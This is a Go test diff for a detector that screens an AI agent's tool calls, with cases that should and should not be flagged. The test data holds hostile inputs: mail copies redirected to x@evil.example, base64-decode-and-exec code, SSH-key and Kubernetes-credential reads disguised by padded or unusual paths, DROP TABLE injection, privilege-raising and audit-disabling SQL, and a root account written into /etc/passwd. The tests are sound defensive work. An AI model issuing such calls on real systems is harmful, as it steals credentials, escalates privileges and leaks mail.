@@ -49,7 +49,7 @@ func TestNonShellToolFindingsByEffect(t *testing.T) {
 		{"privilege sql", "mcp__db__execute", `{"database":"ops","sql":"UPDATE perms SET role='admin' WHERE d='a'"}`, mcpSQLPrivilegeRuleID},
 		{"audit-off sql", "mcp__db__execute", `{"database":"ops","sql":"UPDATE audit_config SET enabled=false"}`, mcpSQLAuditOffRuleID},
 		{"downgrade", "mcp__auth__reset_password", `{"user_id":1,"skip_2fa":true}`, mcpSettingDowngradeID},
-		{"redirect off domain", "mcp__mail__send_batch", `{"recipients":["a@corp.example"],"bcc_override":"x@other.example"}`, mcpSendRedirectRuleID},
+		{"redirect off domain", "mcp__mail__send_batch", `{"from":"me@corp.example","recipients":["a@corp.example"],"bcc_override":"x@other.example"}`, mcpSendRedirectRuleID},
 		{"decode and run", "mcp__code__execute", `{"code":"exec(base64.b64decode(s).decode())"}`, mcpCodeDecodeExecRuleID},
 	}
 	for _, c := range cases {
@@ -228,13 +228,16 @@ func TestNonShellToolReviewFixes(t *testing.T) {
 	}
 	// Every copy and recipient field is read; naming the attacker in "to" proves nothing.
 	for _, args := range []string{
-		`{"to":"x@evil.example","bcc":"x@evil.example"}`,
 		`{"recipients":["a@corp.example"],"cc":"x@evil.example"}`,
 		`{"to":"a@corp.example","forward_to":"x@evil.example"}`,
 	} {
 		if got := nonShellToolFindings(ctx, nonShellReq("mcp__mail__send", args, false), nil, ""); !has(got, mcpSendRedirectRuleID) {
 			t.Errorf("%s: no redirect finding: %+v", args, got)
 		}
+	}
+	// A copy to a host of the call's own recipients adds no party: it is not a redirect.
+	if got := nonShellToolFindings(ctx, nonShellReq("mcp__mail__send", `{"to":"x@evil.example","bcc":"y@evil.example"}`, false), nil, ""); has(got, mcpSendRedirectRuleID) {
+		t.Errorf("a copy to the recipient's own host: %+v", got)
 	}
 	if got := nonShellToolFindings(ctx, nonShellReq("mcp__mail__send", `{"to":"a@corp.example","subject":"x"}`, false), nil, ""); len(got) != 0 {
 		t.Errorf("plain send: %+v", got)
@@ -262,5 +265,77 @@ func TestNonShellToolReviewFixes(t *testing.T) {
 	}
 	if got := nonShellToolFindings(ctx, nonShellReq("mcp__x__read_resource", `{"uri":"file:///etc/k8s/admin.conf"}`, false), nil, ""); !has(got, "PATH-K8S-CLUSTER-CRED") {
 		t.Fatalf("file URI: %+v", got)
+	}
+}
+
+func TestNonShellToolRound2Quiet(t *testing.T) {
+	ctx := context.Background()
+	big := strings.Repeat("benign body text ", 6000) // 100 KB
+	bigArgs := func(m map[string]string) string { b, _ := json.Marshal(m); return string(b) }
+	for _, c := range []struct{ name, tool, args string }{
+		{"large write", "mcp__filesystem__write_file", bigArgs(map[string]string{"path": "/repo/notes.md", "content": big})},
+		{"large issue body", "mcp__github__create_issue", bigArgs(map[string]string{"title": "t", "body": big})},
+		{"large evaluate script", "mcp__playwright__browser_evaluate", bigArgs(map[string]string{"function": big})},
+		{"cc to the recipient's domain", "mcp__mail__send", `{"to":"a@corp.example","cc":"b@corp.example"}`},
+		{"bcc to the recipient's domain", "mcp__mail__send", `{"to":"a@corp.example","bcc":"b@corp.example"}`},
+		{"callback on the call's own API", "mcp__http__post", `{"url":"https://api.corp.example/v1/x","callback_url":"https://api.corp.example/hook"}`},
+		{"search prose", "mcp__acme__search_issues", `{"query":"drop table of contents"}`},
+		{"prose that starts with a bracket", "mcp__acme__post_comment", `{"note":"[INFO] build finished"}`},
+	} {
+		t.Run(c.name, func(t *testing.T) {
+			for _, strict := range []bool{false, true} {
+				if got := nonShellToolFindings(ctx, nonShellReq(c.tool, c.args, strict), nil, ""); len(got) != 0 {
+					t.Fatalf("strict=%v findings = %+v", strict, got)
+				}
+			}
+		})
+	}
+}
+
+func TestNonShellToolRound2Loud(t *testing.T) {
+	ctx := context.Background()
+	has := func(got []RuleFinding, id string) bool { _, ok := findingByID(got, id); return ok }
+	pad := strings.Repeat("./", 600) // a 1.2 KB path, past the old 1024 cap
+	for _, c := range []struct{ name, tool, args, rule string }{
+		{"long padded path", "mcp__filesystem__read_file", `{"path":"/home/u/` + pad + `.ssh/id_rsa"}`, "PATH-SSH-KEY"},
+		{"file uri single slash", "mcp__x__read_resource", `{"uri":"file:/home/u/.ssh/id_rsa"}`, "PATH-SSH-KEY"},
+		{"file uri loopback", "mcp__x__read_resource", `{"uri":"file://127.0.0.1/home/u/.ssh/id_rsa"}`, "PATH-SSH-KEY"},
+		{"double slash", "mcp__x__read_file", `{"path":"//home/u/.ssh/id_rsa"}`, "PATH-SSH-KEY"},
+		{"pathname key", "mcp__x__read_file", `{"pathname":"../.ssh/id_rsa"}`, "PATH-SSH-KEY"},
+		{"proxy json string with a huge number", "mcp__proxy__call_tool", `{"name":"read_file","arguments":"{\"path\":\"/home/u/.ssh/id_rsa\",\"n\":1e400}"}`, "PATH-SSH-KEY"},
+		{"top level args as a json string", "mcp__proxy__call_tool", `"{\"path\":\"/home/u/.ssh/id_rsa\"}"`, "PATH-SSH-KEY"},
+		{"bigquery generic key", "mcp__bigquery__query", `{"query":"DROP TABLE t"}`, mcpSQLDestructiveRuleID},
+		{"postgres operator then drop", "mcp__postgres-prod__query", `{"query":"SELECT 1 # 1; DROP TABLE t"}`, mcpSQLDestructiveRuleID},
+		{"edit_file body under a proxy", "mcp__proxy__call_tool", `{"name":"write","arguments":{"path":"/etc/passwd","content":"svc:x:0:0::/:/bin/sh"}}`, "PATH-ETC-PASSWD"},
+		{"copy outside the recipients with a known account", "mcp__mail__send", `{"from":"me@corp.example","to":"a@corp.example","cc":"x@evil.example"}`, mcpSendRedirectRuleID},
+	} {
+		t.Run(c.name, func(t *testing.T) {
+			if got := nonShellToolFindings(ctx, nonShellReq(c.tool, c.args, false), nil, ""); !has(got, c.rule) {
+				t.Fatalf("default: no %s in %+v", c.rule, got)
+			}
+			if got := nonShellToolFindings(ctx, nonShellReq(c.tool, c.args, true), nil, ""); !has(got, c.rule) {
+				t.Fatalf("strict: no %s in %+v", c.rule, got)
+			}
+		})
+	}
+	// A copy outside the recipients with no account named is uncertain: an alert in every tier, never a block.
+	for _, strict := range []bool{false, true} {
+		got := nonShellToolFindings(ctx, nonShellReq("mcp__mail__send", `{"to":"a@corp.example","bcc":"x@evil.example"}`, strict), nil, "")
+		f, ok := findingByID(got, mcpSendRedirectRuleID)
+		if !ok || f.enforcement != findingEnforcementAlertOnly {
+			t.Fatalf("strict=%v: uncertain redirect = %+v", strict, f)
+		}
+	}
+	// A bound the reading reaches is never clean: the limit finding, and the part seen before it still decides.
+	var items []string
+	for i := 0; i < 600; i++ {
+		items = append(items, "a")
+	}
+	b, _ := json.Marshal(map[string]any{"path": "/home/u/.ssh/id_rsa", "zz_labels": items})
+	for _, strict := range []bool{false, true} {
+		got := nonShellToolFindings(ctx, nonShellReq("mcp__acme__label", string(b), strict), nil, "")
+		if !has(got, "ACTION-COMPOUND-LIMIT") || !has(got, "PATH-SSH-KEY") {
+			t.Fatalf("strict=%v: a cut walk: %+v", strict, got)
+		}
 	}
 }
